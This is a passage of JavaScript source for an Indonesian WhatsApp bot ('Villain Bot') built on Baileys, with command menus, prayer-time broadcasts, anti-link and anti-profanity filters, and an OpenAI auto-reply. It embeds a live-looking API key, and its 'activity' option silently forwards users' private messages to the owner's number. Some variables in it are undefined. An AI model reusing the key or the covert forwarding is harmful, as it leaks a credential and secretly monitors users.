require("./config/config.js");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  Mimetype,
  generateWAMessage,
  prepareWAMessageMedia,
  prepareMessageFromContent,
  jidDecode,
  areJidsSameUser,
  getContentType,
} = require("@adiwajshing/baileys");
const fs = require("fs");
const cheerio = require("cheerio");
const os = require("os");
const util = require("util");
const cron = require('node-cron');
const path = require("path");
const axios = require("axios");
const chalk = require("chalk");
const crypto = require("crypto");
const toMs = require('ms')
const { didYouMean } = require("didyoumean");
const { Configuration, OpenAIApi } = require("openai");
const Satzz = require("@bochilteam/scraper");
const yts = require("yt-search");
const { y2mateA, y2mateV } = require("./lib/y2mate");
const google = require("google-it");
const { exec, spawn, execSync } = require("child_process");
const moment = require("moment-timezone");
const { JSDOM } = require("jsdom");
const speed = require("performance-now");
const { performance } = require("perf_hooks");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon();
const maker = require("mumaker");
const textpro = require("./lib/textpro");
const { TelegraPh } = require("./lib/uploader");
const { Tiktok } = require("./lib/tiktok");
const {
  generateProfilePicture,
  smsg,
  formatp,
  tanggal,
  formatDate,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins,
} = require("./lib/myfunc");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const barat = moment.tz("Asia/Jakarta").format("HH:mm:ss");
const tengah = moment.tz("Asia/Makassar").format("HH:mm:ss");
const timur = moment.tz("Asia/Jayapura").format("HH:mm:ss");
const botname = "© Villain Bot"; //ubah di config biar ngk emro
const prefa = ["!", ".", "#", "&"];
//TIME
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
if (time2 < "23:59:00") {
  var ucapanWaktu = "Selamat Malam";
}
if (time2 < "19:00:00") {
  var ucapanWaktu = "Selamat Sore";
}
if (time2 < "18:00:00") {
  var ucapanWaktu = "Selamat Sore";
}
if (time2 < "15:00:00") {
  var ucapanWaktu = "Selamat Siang";
}
if (time2 < "11:00:00") {
  var ucapanWaktu = "Selamat Pagi";
}
if (time2 < "05:00:00") {
  var ucapanWaktu = "Selamat Pagi";
}

module.exports = SatganzDevs = async (SatganzDevs, m, chatUpdate, store) => {
  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    var prefix = prefa
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : prefa ?? global.prefix;
    const isCmd = body.startsWith(prefix);
    const command = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await SatganzDevs.decodeJid(SatganzDevs.user.id);
    const isCreator = [botNumber, ...global.owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const isOwner = m.sender == "6281316701742@s.whatsapp.net" ? true : false;
    const itsMe = m.sender == botNumber ? true : false;
    const text = (q = args.join(" "));
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const isMedia = /image|video|sticker|audio/.test(mime);
    const sender = m.isGroup
      ? mek.key.participant
        ? mek.key.participant
        : mek.participant
      : mek.key.remoteJid;
    const from = m.key.remoteJid;
    // Group
    const groupMetadata = m.isGroup
      ? await SatganzDevs.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isPremium =
      isCreator ||
      global.premium
        .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
        .includes(m.sender) ||
      false;
    SatganzDevs.sendMessageV2 = async (chatId, message, options = {}) => {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await SatganzDevs.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    };
    let isNumber = (x) => typeof x === "number" && !isNaN(x);
    let chats = global.db.data.chats[m.chat];
    if (typeof chats !== "object") global.db.data.chats[m.chat] = {};
    if (chats) {
      if (!("mute" in chats)) chats.mute = false;
      if (!("antilink" in chats)) chats.antilink = false;
      if (!("antibadword" in chats)) chats.antibadword = false;
      if (!("simi" in chats)) chats.simi = false;
    } else
      global.db.data.chats[m.chat] = {
        mute: false,
        antilink: false,
        antibadword: false,
        simi: false,
      };

    let setting = global.db.data.settings[botNumber];
    if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
    if (setting) {
      if (!isNumber(setting.status)) setting.status = 0;
      if (!("autobio" in setting)) setting.autobio = false;
      if (!("activity" in setting)) setting.activity = false;
      if (!("autoai" in setting)) setting.autoai = false;
    } else
      global.db.data.settings[botNumber] = {
        status: 0,
        autobio: false,
        activity: false,
        autoai: false,
      };
    function proses(jid) {
      SatganzDevs.sendMessage(
        m.chat,
        {
          audio: fs.readFileSync("./sound/cepetan.mp3"),
          mimetype: "audio/mpeg",
          ptt: true,
        },
        { quoted: m }
      );
    }
    
   
    //function leveling & pick
    function pickRandom(list) {
      return list[Math.floor(Math.random() * list.length)];
    }
    var sal = "assalamualaikum";
    let salman = new RegExp(sal, "i");
    let salam = salman.test(budy);
    if (salam) {
      SatganzDevs.sendMessage(
        m.chat,
        {
          audio: fs.readFileSync("./sound/waalaikumsalam.mp3"),
          mimetype: "audio/mpeg",
          ptt: true,
        },
        { quoted: m }
      );
    }
    
    // Public & Self
    if (!SatganzDevs.public) {
      if (!isCreator) return;
    }
    
    //KONTOLODIN
    SatganzDevs.sendMessageV2 = async (chatId, message, options = {}) => {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await SatganzDevs.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    };

    const reply = async (teks) => {
      try {
        pporg = await SatganzDevs.profilePictureUrl(m.sender, "image");
      } catch {
        pporg =
          "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
      }
      let PPUSER = await getBuffer(pporg);
      await SatganzDevs.sendMessageV2(
        m.chat,
        {
          text: teks,
          contextInfo: {
            mentions: parseMention(teks),
            externalAdReply: {
              showAdAttribution: true,
              title: `${ucapanWaktu}`,
              body: pushname,
              thumbnail: thumb,
              mediaType: 2,
              mediaUrl: "https://bit.ly/3uumZI6",
              sourceUrl: "https://bit.ly/3uumZI6",
            },
          },
        },
        { quoted: m }
      );
    };
    
    // AUTO TYPING AND AUTO READ
    SatganzDevs.readMessages([m.key]);
    SatganzDevs.sendPresenceUpdate("available", m.chat);
    // LOGS ACTIVITY
    if (isCmd && m.isGroup) {
      console.log(
        chalk.bold.rgb(
          255,
          178,
          102
        )("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"),
        chalk.bold.rgb(153, 255, 153)(command),
        chalk.bold.rgb(204, 204, 0)("from"),
        chalk.bold.rgb(153, 255, 204)(pushname),
        chalk.bold.rgb(204, 204, 0)("in"),
        chalk.bold.rgb(255, 178, 102)("Group Chat"),
        chalk.bold("[" + args.length + "]")
      );
    }
    if (isCmd && !m.isGroup) {
      console.log(
        chalk.bold.rgb(
          255,
          178,
          102
        )("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"),
        chalk.bold.rgb(153, 255, 153)(command),
        chalk.bold.rgb(204, 204, 0)("from"),
        chalk.bold.rgb(153, 255, 204)(pushname),
        chalk.bold.rgb(204, 204, 0)("in"),
        chalk.bold.rgb(255, 178, 102)("Private Chat"),
        chalk.bold("[" + args.length + "]")
      );
    }
    //pengingat sholat
    
        cron.schedule('0 13 12 * * *', () => {
            console.log('Waktu Sholat Zuhur')
            let anu = store.chats.all().map(v => v.id)
             for (let i of anu) {
            SatganzDevs.sendMessage(i, { text: 'Saatnya *SHOLAT ZUHUR*\nSahabat terbaik dan musuh terburuk kita adalah pikiran-pikiran kita. Pikiran dapat lebih baik dari seorang dokter atau seorang bankir atau seorang teman kepercayaan. Juga dapat lebih berbahaya dadi penjahat.'})
            }
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
        cron.schedule('0 39 15 * * *', () => {
            console.log('Waktu Sholat Asar')
            let anu = store.chats.all().map(v => v.id)
             for (let i of anu) {
            SatganzDevs.sendMessage(i, { text: 'Saatnya *SHOLAT ASHAR*\nSahabat terbaik dan musuh terburuk kita adalah pikiran-pikiran kita. Pikiran dapat lebih baik dari seorang dokter atau seorang bankir atau seorang teman kepercayaan. Juga dapat lebih berbahaya dadi penjahat.'})
            }
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
        cron.schedule('0 18 18 * * *', () => {
            console.log('Waktu Sholat Maghrib')
            let anu = store.chats.all().map(v => v.id)
             for (let i of anu) {
            SatganzDevs.sendMessage(i, { text: 'Saatnya *SHOLAT MAGHRIB*\nSahabat terbaik dan musuh terburuk kita adalah pikiran-pikiran kita. Pikiran dapat lebih baik dari seorang dokter atau seorang bankir atau seorang teman kepercayaan. Juga dapat lebih berbahaya dadi penjahat.'})
            }
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
        cron.schedule('0 33 19 * * *', () => {
            console.log('Waktu Sholat isya')
            let anu = store.chats.all().map(v => v.id)
             for (let i of anu) {
            SatganzDevs.sendMessage(i, { text: 'Saatnya *SHOLAT ISYA*\nSahabat terbaik dan musuh terburuk kita adalah pikiran-pikiran kita. Pikiran dapat lebih baik dari seorang dokter atau seorang bankir atau seorang teman kepercayaan. Juga dapat lebih berbahaya dadi penjahat.'})
            }
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
        cron.schedule('0 45 4 * * *', () => {
            console.log('Waktu Sholat SUBUH')
            let anu = store.chats.all().map(v => v.id)
             for (let i of anu) {
            SatganzDevs.sendMessage(i, { text: 'Saatnya *SHOLAT SUBUH*\nSahabat terbaik dan musuh terburuk kita adalah pikiran-pikiran kita. Pikiran dapat lebih baik dari seorang dokter atau seorang bankir atau seorang teman kepercayaan. Juga dapat lebih berbahaya dadi penjahat.'})
            }
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
    //AUTO AI
    if (global.db.data.settings[botNumber].autoai) {
      if (isCmd && !m.isGroup) {
        try {
          const configuration = new Configuration({
            apiKey: "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",
          });
          const openai = new OpenAIApi(configuration);
          console.log("AI RESPON!!!!");
          const response = await openai.createCompletion({
            model: "text-davinci-003",
            prompt: budy,
            temperature: 0.3,
            max_tokens: 3000,
            top_p: 1.0,
            frequency_penalty: 0.0,
            presence_penalty: 0.0,
          });
          reply(`${response.data.choices[0].text}\n\n`);
        } catch (err) {
          console.log(err);
          m.reply("Maaf, sepertinya ada yang error");
        }
      }
    }
    // AUTO SIMSIMI
    if (db.data.chats[m.chat].simi && isCmd && !m.isGroup) {
      SatganzDevs.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });
      let jawab = await fetchJson(`https://api.akuari.my.id/simi/simi?query={m.text}`)
      SatganzDevs.sendButtonText(
        m.chat,
        [
          {
            buttonId: "simi off",
            buttonText: { displayText: "Matikan Chat Bot!" },
            type: 1,
          },
        ],
        jawab.respon,
        botname,
        m
      );
    }

    // ACTIVITY INFO
    if (
      !m.isGroup &&
      !isOwner &&
      isCmd &&
      global.db.data.settings[botNumber].activity
    ) {
      let info = m.copyNForward(
        "6281316701742@s.whatsapp.net",
        false,
        m.quoted && m.quoted.fromMe
          ? {
              contextInfo: {
                ...m.msg.contextInfo,
                forwardingScore: 10000000,
                isForwarded: false,
                participant: [m.sender],
              },
            }
          : {}
      );
      await sleep(300);
      let anudia = `Dari @${m.sender.split("@")[0]} Jam : ${moment()
        .tz("Asia/Jakarta")
        .format("HH:mm:ss")}`;
      SatganzDevs.sendMessage(
        "6281316701742@s.whatsapp.net",
        { text: anudia, mentions: parseMention(anudia) },
        { quoted: m }
      );
    }
    // -------[ ANTI LINK ]------- \\
    if (global.db.data.chats[m.chat].antilink) {
      let gclink =
        `https://chat.whatsapp.com/` +
        (await SatganzDevs.groupInviteCode(from));
      let isLinkThisGc = new RegExp(gclink, "i");
      let isgclink = isLinkThisGc.test(budy);
      if (
        budy.match(`chat.whatsapp.com`) &&
        !isgclink &&
        !isGroupAdmins &&
        isBotGroupAdmins &&
        isGroup
      ) {
        var hapus = m.key.participant;
        var bang = m.key.id;
        SatganzDevs.sendMessage(from, {
          delete: {
            remoteJid: from,
            fromMe: false,
            id: bang,
            participant: hapus,
          },
        });
      }
    }

    // -------[ ANTI BADWORD ]------- \\
    if (global.db.data.chats[m.chat].antibadword && m.isGroup) {
      let badwordRegex =
        /anj(k|g)|ajn?(g|k)|a?njin(g|k)|bajingan|b(a?n)?gsa?t|ko?nto?l|me?me?(k|q)|pe?pe?(k|q)|meki|titi(t|d)|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|(k|ng)e?nto?(t|d)|jembut|bego|dajj?al|janc(u|o)k|pantek|puki ?(mak)?|kimak|kampang|lonte|col(i|mek?)|pelacur|henceu?t|nigga|fuck|dick|bitch|tits|bastard|asshole/i; // tambahin sendiri
      let isBadword = badwordRegex.test(text);
      if (isBadword) {
        var hapus = m.key.participant;
        var bang = m.key.id;
        SatganzDevs.sendMessage(from, {
          delete: {
            remoteJid: from,
            fromMe: false,
            id: bang,
            participant: hapus,
          },
        });
      }
    }
    switch (command) {
      case "ping":
      case "botstatus":
      case "statusbot":
        {
          const used = process.memoryUsage();
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${
            oldd - neww
          } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}

${
  cpus[0]
    ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
          reply(respon);
        }
        break;
      case "speedtest":
        {
          reply("Testing Speed...");
          let cp = require("child_process");
          let { promisify } = require("util");
          let exec = promisify(cp.exec).bind(cp);
          let o;
          try {
            o = await exec("python speed.py");
          } catch (e) {
            o = e;
          } finally {
            let { stdout, stderr } = o;
            if (stdout.trim()) reply(stdout);
            if (stderr.trim()) reply(stderr);
          }
        }
        break;
      case "owner":
      case "pemilik":
        SatganzDevs.sendContact(from, global.owner, m);
        break;
      case "self":
        if (!isCreator) return reply(mess.owner);
        SatganzDevs.public = false;
        reply("Success Change To Self Usage");
        break;
      case "public": {
        if (!isCreator) return reply(mess.owner);
        SatganzDevs.public = true;
        reply("Success Change To Public Usage");
        }
        break;

      case "menu":
      case "help":
      case "main":
      case "?": 
        var listMsg = {
          title: `${ucapanWaktu} - @${sender.split("@")[0]}`,
          text: `Aku *VillainBot* Aku Bisa Membantu Mu Kalau Kamu Mau, Mau Atau Tidak Aku Tidak Peduli\nKlik Tombol Di Bawah Untuk Melihat Semua Fitur Bot`,
          buttonText: "Click Here!",
          footer: botname,
          mentions: [m.sender],
          sections: [
            {
              title: "info tentang owner dan bot ini",
              rows: [
                {
                  title: "【👤】› Contact Owner ‹",
                  rowId: `${prefix}owner`,
                  description: "",
                },
                {
                  title: "【⌛】› Kecepatan Respon ‹",
                  rowId: `${prefix}ping`,
                  description: "",
                },
                {
                  title: "【🖇️】› Source Code  ‹",
                  rowId: `${prefix}sc`,
                  description: "",
                },
              ],
            },
            {
              title: "All Menu",
              rows: [
                {
                  title: "【🤡】› Owner ‹",
                  rowId: `${prefix}menuowner`,
                  description: "Memperlihatkan list owner menu",
                },
                {
                  title: "【🏢】› Group ‹",
                  rowId: `${prefix}menugroup`,
                  description: "Memperlihatkan list group",
                },
                {
                  title: "【🌌】› Random Image ‹",
                  rowId: `${prefix}menuimage`,
                  description: "Memperlihatkan list random Image",
                },
                {
                  title: "【📲】› Downloader ‹",
                  rowId: `${prefix}menudl`,
                  description: "Memperlihatkan list Downloader",
                },
                {
                  title: "【🔎】› Search ‹",
                  rowId: `${prefix}menusearch`,
                  description: "Memperlihatkan list Searching",
                },
                {
                  title: "【📝】› Random Text ‹",
                  rowId: `${prefix}menuquotes`,
                  description: "Memperlihatkan list random text",
                },
                {
                  title: "【🔧】› Tools ‹",
                  rowId: `${prefix}menutools`,
                  description: "Memperlihatkan list Tools",
                },
                {
                  title: "【😎】› Sticker ‹",
                  rowId: `${prefix}menusticker`,
                  description: "Memperlihatkan list Sticker",
                },
              ],
            },
          ],
        };
       SatganzDevs.sendMessage(from, listMsg);
     
        break;
      case "menuowner":
        {
          let anu = `╭──❍ *Owner Menu*
│
│⭔ ${prefix}setppbot
│⭔ ${prefix}activity [option]
│⭔ ${prefix}autoai [option]
│⭔ ${prefix}self
│⭔ ${prefix}public
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}ban @user
│⭔ ${prefix}unban @user
│⭔ ${prefix}bcall
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menugroup":
        {
          let anu = `╭──❍ *Owner Menu*
│
│⭔ ${prefix}antilink
│⭔ ${prefix}antibadword
│⭔ ${prefix}setppgrup
│⭔ ${prefix}tagall [pesan]
│⭔ ${prefix}hidetag [pesan]
│⭔ ${prefix}group open/close
│⭔ ${prefix}kick @tag
│⭔ ${prefix}add 628××××
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menusearch":
        {
          let anu = `╭──❍ *Search Menu*
│
│⭔ ${prefix}gcsearch [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menuimage":
        {
          let anu = `╭──❍ *Image Menu*
│
│⭔ ${prefix}waifu
│⭔ ${prefix}coffe
│⭔ ${prefix}couple
│⭔ ${prefix}wallpaper [query] 
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menudl":
        {
          let anu = `╭──❍ *Downloader Menu*
│
│⭔ ${prefix}tiktok [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}ytmp3  [url]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}play [query]
│⭔ ${prefix}fbdl [url]
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menutools":
        {
          let anu = `╭──❍ *Tools Menu*
│
│⭔ ${prefix}toimage [sticker]
│⭔ ${prefix}tourl [tag]
│⭔ ${prefix}toaudio
│⭔ ${prefix}tovn 
│⭔ ${prefix}togif
│⭔ ${prefix}imagenobg
│⭔ ${prefix}tts
│⭔ ${prefix}toqr
│⭔ ${prefix}menfess [nomor tujuan]
│⭔ ${prefix}gitclone
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menusticker":
        {
          let anu = `╭──❍ *Sticker Menu*
│
│⭔ ${prefix}sticker [image]
│⭔ ${prefix}smeme [image]
│⭔ ${prefix}doge
│⭔ ${prefix}patrick
│⭔ ${prefix}dinokuning 
│⭔ ${prefix}gojosatoru
│⭔ ${prefix}hopeboy
│⭔ ${prefix}nicholas
│⭔ ${prefix}krrobot
│⭔ ${prefix}jiisho
│⭔ ${prefix}tyni
│⭔ ${prefix}meow
│⭔ ${prefix}menjamet
│⭔ ${prefix}popoci
│⭔ ${prefix}kawansponbob
│⭔ ${prefix}sponbob
│⭔ ${prefix}kucing
│⭔ ${prefix}lidi
│⭔ ${prefix}lonet
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
      case "menuquotes":
        {
          let anu = `╭──❍ *Random Text Menu*
│
│⭔ ${prefix}motivasi
│⭔ ${prefix}gombalan
│⭔ ${prefix}katabucin
│⭔ ${prefix}aksarajawa
│⭔ ${prefix}katabucin
│⭔ ${prefix}quotes
│⭔ ${prefix}renungan
│⭔ ${prefix}quotesjawa
│⭔ ${prefix}dilan
│⭔ ${prefix}katailham
│⭔ ${prefix}katagalau
│⭔ ${prefix}quotesanime
│
╰────❍`;
          let buttonMessage = {
            image: global.thumb,
            fileLength: 9999999999999,
            caption: anu,
            footer: botname,
            mentions: [m.sender],
            buttons: [
              {
                buttonId: "menu",
                buttonText: { displayText: "Back" },
                type: 1,
              },
              {
                buttonId: "owner",
                buttonText: { displayText: "owner" },
                type: 1,
              },
            ],
            headerType: 4,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `${ucapanWaktu}`,
                body: pushname,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: "https://bit.ly/3uumZI6",
                sourceUrl: "https://bit.ly/3uumZI6",
              },
            },
          };
          SatganzDevs.sendMessage(from, buttonMessage);
        }
        break;
        case "bc":
        case "bcall": {
        if (!isOwner) return reply(mess.owner)
        if (!q) return reply('Textnya Om?')
        let anu = await store.chats.all().map(v => v.id)
        for (let i of anu) {
        let buttonMessage = {
            text: `${q}`,
            footer: `VillainBot Broadcast`,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Website Owner`,
                  url: "https://bit.ly/SatganzDevs",
                },
              },
              { quickReplyButton: { displayText: `Menu`, id: "menu" } },
            ],
            headerType: 4,
          };
        SatganzDevs.sendMessage(i, buttonMessage)
        }
        reply('success broadcast to ' + anu.length +' chats')
       }
       break;
      case "quotesanime":
      case "quoteanime":
        {
          let { quotesAnime } = require("./lib/scraper");
          let anu = await quotesAnime();
          result = anu[Math.floor(Math.random() * anu.length)];
          let buttons = [
            { buttonId: command, buttonText: { displayText: "NEXT" }, type: 1 },
          ];
          let buttonMessage = {
            text: `~_${result.quotes}_\n\nBy '${result.karakter}' \n\nAnime : ${result.anime}\n\n- ${result.up_at}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + result.quotes,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "motivasi":
        {
          let anu = await fetchJson(
            "https://api.akuari.my.id/randomtext/katabijak"
          );
          result = anu.hasil.quotes;
          let buttons = [
            { buttonId: command, buttonText: { displayText: "NEXT" }, type: 1 },
          ];
          let buttonMessage = {
            text: result,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + result,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
